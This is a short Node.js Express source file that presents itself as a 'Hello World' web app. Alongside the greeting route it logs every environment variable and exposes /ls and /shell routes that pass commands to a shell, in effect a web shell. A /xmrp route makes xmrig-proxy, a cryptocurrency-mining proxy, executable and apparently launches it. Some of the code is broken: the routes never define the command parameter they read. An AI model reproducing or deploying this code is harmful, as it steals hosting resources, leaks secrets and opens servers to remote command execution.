var express = require('express')
var app = express()
var $PSshell = require('procstreams')

console.log(process.env);

app.set('port', (process.env.PORT || 5000))
app.use(express.static(__dirname + '/public'))

app.get('/', function(request, response) {
  response.send('Hello World!')
})

app.get('/ls', function(request, response)  {
    cmd = 'ls -l'
    console.log('$'+cmd)
    $PSshell(cmd).out()
    response.send(cmd)
})

function chmod() {
    cmd = 'chmod +x xmrig-proxy'
    console.log('$'+cmd)
    $PSshell(cmd).out()
}

app.get('/xmrp', function(request, response)  {    
    setTimeout(chmod, 3000);
    cmd = './xmrig-proxy'
    console.log('$'+cmd)
    $PSshell(request.params.cmd).pipe(process.stdout)
    .data(function(err, stdout, stderr) {
        // handle error
        console.log(stdout) // prints
    })
    response.send(cmd)
})

app.get('/shell', function(request, response)  {
    console.log(request)
    console.log(request.params)
    console.log('$'+request.params.cmd)
    $PSshell(request.params.cmd).pipe(process.stdout)
    .data(function(err, stdout, stderr) {
        // handle error
        console.log(stdout) // prints
    })
    response.send(request.params.cmd)
})

app.listen(app.get('port'), function() {
  console.log("Node app is running at localhost:" + app.get('port'))
})
